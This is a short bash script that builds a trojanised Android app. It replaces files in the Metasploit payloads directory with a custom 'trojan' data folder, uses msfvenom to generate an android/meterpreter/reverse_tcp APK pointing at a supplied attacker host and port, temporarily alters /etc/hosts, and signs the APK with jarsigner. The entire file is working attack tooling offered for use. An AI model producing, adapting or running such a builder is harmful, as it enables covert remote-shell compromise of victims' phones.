#!/bin/bash

TROJAN_DIR=$1

LHOST="$2"

LPORT="$3"

TROJAN="$4.apk"

MSFP_DIR=$(find /usr/share/metasploit-framework/vendor/bundle/ruby/*/gems -name "metasploit-payloads-*" -print | tail -n 1)

#Fill the empty variables in
KEYSTORE=""

ALIAS_KEY=""

if [ $# -eq 4 ]; then

	:

else

	echo "$0 <framework> <LHOST> <LPORT> <trojan-name>"
	exit 0

fi

if [ -z $MSFP_DIR ]; then

	echo "[!] Could not find metasploit-payloads directory!"
	exit 0

fi

if [ -d $TROJAN_DIR ]; then

	:

else

	echo "[!] Your trojan directory doesn't exist!"
	exit 0

fi

if [ -d $MSFP_DIR/data.bak ]; then

	echo "[!] data.bak exists!"
        echo "[!] Skipping data folder backup."

else

	echo "[+] Creating a backup of data folder in case things go wrong"
	cp -r $MSFP_DIR/data $MSFP_DIR/data.bak

fi

echo "[+] Copying new trojan over..."

cp -r $TROJAN_DIR/data $MSFP_DIR

echo -e "127.0.0.1	$LHOST" >> /etc/hosts

#Compile the trojan
echo "[+] Creating trojan and saving as $TROJAN"
msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o "$TROJAN"
sed -i "s/127.0.0.1\t$LHOST//" /etc/hosts
echo "[+] Signing with jarsigner"
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore "$KEYSTORE" "$TROJAN" "$ALIAS_KEY"
